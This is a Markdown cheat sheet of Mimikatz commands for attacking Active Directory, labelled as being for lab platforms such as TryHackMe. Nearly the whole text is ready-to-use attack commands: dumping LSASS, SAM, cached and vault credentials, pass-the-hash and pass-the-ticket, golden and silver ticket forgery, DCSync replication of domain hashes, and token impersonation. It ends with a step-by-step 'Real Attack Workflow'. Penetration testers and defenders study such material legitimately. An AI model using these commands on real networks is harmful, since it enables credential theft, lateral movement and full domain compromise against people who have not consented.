#  Mimikatz Cheat Sheet (Active Directory Attacks)

>  For educational / lab use only (TryHackMe, HTB, internal labs)

---

#  0. Running Mimikatz

```cmd
mimikatz.exe
```

##  Elevate privileges

```text
privilege::debug
token::elevate
```

---

#  1. Credential Dumping

## Dump all credentials (LSASS)

```text
sekurlsa::logonpasswords
```

 Shows:

* Plaintext passwords
* NTLM hashes
* Kerberos tickets

---

## Dump NTLM hashes only

```text
sekurlsa::msv
```

---

## Dump Kerberos tickets

```text
sekurlsa::tickets
```

---

## Export tickets

```text
sekurlsa::tickets /export
```

---

#  2. SAM & SYSTEM Dumping

## Dump local SAM hashes

```text
lsadump::sam
```

---

## Dump cached domain creds

```text
lsadump::cache
```

---

## Dump LSA secrets

```text
lsadump::secrets
```

---

#  3. Pass-the-Hash (PTH)

## Spawn process with NTLM hash

```text
sekurlsa::pth /user:<user> /domain:<domain> /ntlm:<hash> /run:cmd.exe
```

 Example:

```text
sekurlsa::pth /user:Administrator /domain:za.tryhackme.com /ntlm:HASH /run:cmd.exe
```

---

#  4. Pass-the-Ticket (PTT)

## Inject ticket

```text
kerberos::ptt <ticket.kirbi>
```

---

## List current tickets

```text
kerberos::list
```

---

#  5. Golden Ticket Attack

## Requirements:

* KRBTGT NTLM hash
* Domain SID

## Command

```text
kerberos::golden /user:Administrator /domain:za.tryhackme.com /sid:<SID> /krbtgt:<hash> /id:500 /ptt
```

---

#  6. Silver Ticket Attack

## Requirements:

* Service account hash

## Example

```text
kerberos::golden /user:Administrator /domain:za.tryhackme.com /sid:<SID> /target:<target> /service:cifs /rc4:<hash> /ptt
```

---

#  7. DCSync Attack

## Dump domain hashes remotely

```text
lsadump::dcsync /domain:za.tryhackme.com /user:Administrator
```

 Requires:

* Domain admin OR replication privileges

---

#  8. Token Manipulation

## List tokens

```text
token::list
```

---

## Impersonate token

```text
token::impersonate <token_id>
```

---

#  9. Vault & Credential Manager

## Dump vault creds

```text
vault::list
vault::cred
```

---

## Windows Credential Manager

```text
credman::list
```

---

#  10. Misc Useful Commands

## Check privileges

```text
privilege::debug
```

---

## Elevate to SYSTEM

```text
token::elevate
```

---

## Exit

```text
exit
```

---

#  11. Real Attack Workflow

```text
1. privilege::debug
2. sekurlsa::logonpasswords
3. lsadump::sam
4. sekurlsa::pth
5. lsadump::dcsync
6. kerberos::golden
```

---

#  12. Common Errors

## Access denied

* Not SYSTEM

## No credentials shown

* Run elevated
* AV blocking

## DCSync fails

* Not enough privileges

---

#  Key Takeaways

* Mimikatz = credential access + lateral movement
* Focus on:

  * NTLM hashes
  * Kerberos tickets
  * Service accounts
* Combine with:

  * PsExec
  * WMIExec
  * SMBExec

---

#  Minimal Commands to Remember

```text
sekurlsa::logonpasswords
sekurlsa::pth
lsadump::dcsync
kerberos::golden
kerberos::ptt
```
